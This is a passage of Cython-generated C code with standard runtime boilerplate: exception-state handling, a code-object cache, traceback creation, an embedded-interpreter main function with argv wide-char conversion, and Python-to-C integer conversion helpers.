    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
}
#endif

/* CLineInTraceback */
#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(CYTHON_UNUSED PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif

/* CodeObjectCache */
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}

/* AddTraceback */
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
    #endif
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
        #endif
    }
    #if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes, /*PyObject *code,*/
        __pyx_empty_tuple, /*PyObject *consts,*/
        __pyx_empty_tuple, /*PyObject *names,*/
        __pyx_empty_tuple, /*PyObject *varnames,*/
        __pyx_empty_tuple, /*PyObject *freevars,*/
        __pyx_empty_tuple, /*PyObject *cellvars,*/
        py_srcfile,   /*PyObject *filename,*/
        py_funcname,  /*PyObject *name,*/
        py_line,
        __pyx_empty_bytes  /*PyObject *lnotab*/
    );
    Py_DECREF(py_srcfile);
    #else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    #endif
    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_srcfile);
    #endif
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject *ptype, *pvalue, *ptraceback;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) {
            /* If the code object creation fails, then we should clear the
               fetched exception references and propagate the new exception */
            Py_XDECREF(ptype);
            Py_XDECREF(pvalue);
            Py_XDECREF(ptraceback);
            goto bad;
        }
        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            /*PyThreadState *tstate,*/
        py_code,           /*PyCodeObject *code,*/
        __pyx_d,    /*PyObject *globals,*/
        0                  /*PyObject *locals*/
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}

/* MainFunction */
#ifdef __FreeBSD__
#include <floatingpoint.h>
#endif
#if PY_MAJOR_VERSION < 3
int main(int argc, char** argv) {
#elif defined(WIN32) || defined(MS_WINDOWS)
int wmain(int argc, wchar_t **argv) {
#else
static int __Pyx_main(int argc, wchar_t **argv) {
#endif
    /* 754 requires that FP exceptions run in "no stop" mode by default,
     * and until C vendors implement C99's ways to control FP exceptions,
     * Python requires non-stop mode.  Alas, some platforms enable FP
     * exceptions by default.  Here we disable them.
     */
#ifdef __FreeBSD__
    fp_except_t m;
    m = fpgetmask();
    fpsetmask(m & ~FP_X_OFL);
#endif
    if (argc && argv)
        Py_SetProgramName(argv[0]);
    Py_Initialize();
    if (argc && argv)
        PySys_SetArgv(argc, argv);
    {
      PyObject* m = NULL;
      __pyx_module_is_main_source = 1;
      #if PY_MAJOR_VERSION < 3
          initsource();
      #elif CYTHON_PEP489_MULTI_PHASE_INIT
          m = PyInit_source();
          if (!PyModule_Check(m)) {
              PyModuleDef *mdef = (PyModuleDef *) m;
              PyObject *modname = PyUnicode_FromString("__main__");
              m = NULL;
              if (modname) {
                  m = PyModule_NewObject(modname);
                  Py_DECREF(modname);
                  if (m) PyModule_ExecDef(m, mdef);
              }
          }
      #else
          m = PyInit_source();
      #endif
      if (PyErr_Occurred()) {
          PyErr_Print();
          #if PY_MAJOR_VERSION < 3
          if (Py_FlushLine()) PyErr_Clear();
          #endif
          return 1;
      }
      Py_XDECREF(m);
    }
#if PY_VERSION_HEX < 0x03060000
    Py_Finalize();
#else
    if (Py_FinalizeEx() < 0)
        return 2;
#endif
    return 0;
}
#if PY_MAJOR_VERSION >= 3 && !defined(WIN32) && !defined(MS_WINDOWS)
#include <locale.h>
static wchar_t*
__Pyx_char2wchar(char* arg)
{
    wchar_t *res;
#ifdef HAVE_BROKEN_MBSTOWCS
    /* Some platforms have a broken implementation of
     * mbstowcs which does not count the characters that
     * would result from conversion.  Use an upper bound.
     */
    size_t argsize = strlen(arg);
#else
    size_t argsize = mbstowcs(NULL, arg, 0);
#endif
    size_t count;
    unsigned char *in;
    wchar_t *out;
#ifdef HAVE_MBRTOWC
    mbstate_t mbs;
#endif
    if (argsize != (size_t)-1) {
        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));
        if (!res)
            goto oom;
        count = mbstowcs(res, arg, argsize+1);
        if (count != (size_t)-1) {
            wchar_t *tmp;
            /* Only use the result if it contains no
               surrogate characters. */
            for (tmp = res; *tmp != 0 &&
                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)
                ;
            if (*tmp == 0)
                return res;
        }
        free(res);
    }
#ifdef HAVE_MBRTOWC
    /* Overallocate; as multi-byte characters are in the argument, the
       actual output could use less memory. */
    argsize = strlen(arg) + 1;
    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    memset(&mbs, 0, sizeof mbs);
    while (argsize) {
        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);
        if (converted == 0)
            break;
        if (converted == (size_t)-2) {
            /* Incomplete character. This should never happen,
               since we provide everything that we have -
               unless there is a bug in the C library, or I
               misunderstood how mbrtowc works. */
            fprintf(stderr, "unexpected mbrtowc result -2\\n");
            free(res);
            return NULL;
        }
        if (converted == (size_t)-1) {
            /* Conversion error. Escape as UTF-8b, and start over
               in the initial shift state. */
            *out++ = 0xdc00 + *in++;
            argsize--;
            memset(&mbs, 0, sizeof mbs);
            continue;
        }
        if (*out >= 0xd800 && *out <= 0xdfff) {
            /* Surrogate character.  Escape the original
               byte sequence with surrogateescape. */
            argsize -= converted;
            while (converted--)
                *out++ = 0xdc00 + *in++;
            continue;
        }
        in += converted;
        argsize -= converted;
        out++;
    }
#else
    /* Cannot use C locale for escaping; manually escape as if charset
       is ASCII (i.e. escape all bytes > 128. This will still roundtrip
       correctly in the locale's charset, which must be an ASCII superset. */
    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    while(*in)
        if(*in < 128)
            *out++ = *in++;
        else
            *out++ = 0xdc00 + *in++;
    *out = 0;
#endif
    return res;
oom:
    fprintf(stderr, "out of memory\\n");
    return NULL;
}
int
main(int argc, char **argv)
{
    if (!argc) {
        return __Pyx_main(0, NULL);
    }
    else {
        int i, res;
        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        char *oldloc = strdup(setlocale(LC_ALL, NULL));
        if (!argv_copy || !argv_copy2 || !oldloc) {
            fprintf(stderr, "out of memory\\n");
            free(argv_copy);
            free(argv_copy2);
            free(oldloc);
            return 1;
        }
        res = 0;
        setlocale(LC_ALL, "");
        for (i = 0; i < argc; i++) {
            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);
            if (!argv_copy[i]) res = 1;
        }
        setlocale(LC_ALL, oldloc);
        free(oldloc);
        if (res == 0)
            res = __Pyx_main(argc, argv_copy);
        for (i = 0; i < argc; i++) {
#if PY_VERSION_HEX < 0x03050000
            free(argv_copy2[i]);
#else
            PyMem_RawFree(argv_copy2[i]);
#endif
        }
        free(argv_copy);
        free(argv_copy2);
        return res;
    }
}
#endif

/* CIntToPy */
    static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
    }
}

/* CIntFromPyVerify */
    #define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }

/* CIntFromPy */
    static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(long) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {
                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {
                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {
                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(long) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(long) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}

/* CIntFromPy */
    static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(int) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {
                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {
                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {
                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(int) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
